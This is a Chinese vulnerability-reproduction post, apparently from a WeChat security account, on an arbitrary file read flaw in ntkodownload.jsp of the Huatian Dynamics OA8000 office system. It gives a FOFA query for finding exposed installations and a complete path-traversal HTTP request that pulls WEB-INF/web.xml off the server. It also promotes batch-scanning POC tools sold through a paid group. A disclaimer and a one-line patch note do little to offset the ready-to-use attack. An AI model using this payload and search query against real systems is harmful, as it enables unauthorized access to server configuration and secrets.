#  华天动力OA8000办公系统ntkodownload.jsp存在任意文件读取漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-01 23:24  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 华天动力OA8000办公系统ntkodownload.jsp简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
华天动力OA8000办公系统  
## 2.漏洞描述  
  
华天动力是我国首批OA企业,是双软认证的高新技术企业,专注OA办公系统20余年,开放免费OA系统下载试用,旗下OA产品累计为37500多个客户提供高效OA办公体验,为各类政府企业提供高端高效OA系统产品,华天动力OA办公系统存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
华天动力OA8000办公系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2Nuz3mWghwtudNbicGrqNNBObCS3hrYMnpyicqVjYTomAibu0KPKBbllBkmhA/640?wx_fmt=jpeg&from=appmsg "null")  
  
华天动力OA8000办公系统ntkodownload.jsp存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="华天动力-OA8000"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml  
  
漏洞数据包：  
```
GET /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2Nuz78FH7Q8MXhtdA0Z7zYqz1iapwB89da3RicEjHxtcpjbzPiaUsABJPP5sA/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2NuznobPTOEJYoHiaSrFfHPjW5XwjrKbcZiah681c3ep1yvCFGH8sibOMxJcg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2Nuznj4icc2HG45wunCrJvFI77ckYel7HXHt9AV39GDLY5dMk8vA0dsiaK0w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2NuzmazkaGVbpXvj6P0ULHvza3icj3TSMtibouYRmClYZiawBpV2kb6gSibQuA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2Nuz8ex7vVgicqO0ibziabVRENWwHBhklSp3cItfsicnfcnuLT97pAISjbpicicg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZxKraLZMIE3ibS9TJPz2NuzEKiaQic9r9GLLnKvevjmxyYU8qtkoibx1sKFuVoVxXEMa0IiccSYfuUSsg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系官方更新补丁：https://www.oa8000.com/  
## 8.往期回顾  
  
[蓝凌OA wechatLoginHelper存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485442&idx=1&sn=1dd5f1210b7a66a5852bde27aafdbc1e&chksm=974b8505a03c0c131fe130c035de9c37e9c0bf9c52a284ed05a8b278aa02514be174f3d40464&scene=21#wechat_redirect)  
  
  
[九思OA软件user_list_3g.jsp存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485429&idx=1&sn=339c4d6dbbdb0a82224605c11e82e56c&chksm=974b8af2a03c03e41d8e7c639183eb9298a16add3abec2eea9332c84be6dfb51850e1626c62d&scene=21#wechat_redirect)  
  
  
  
  
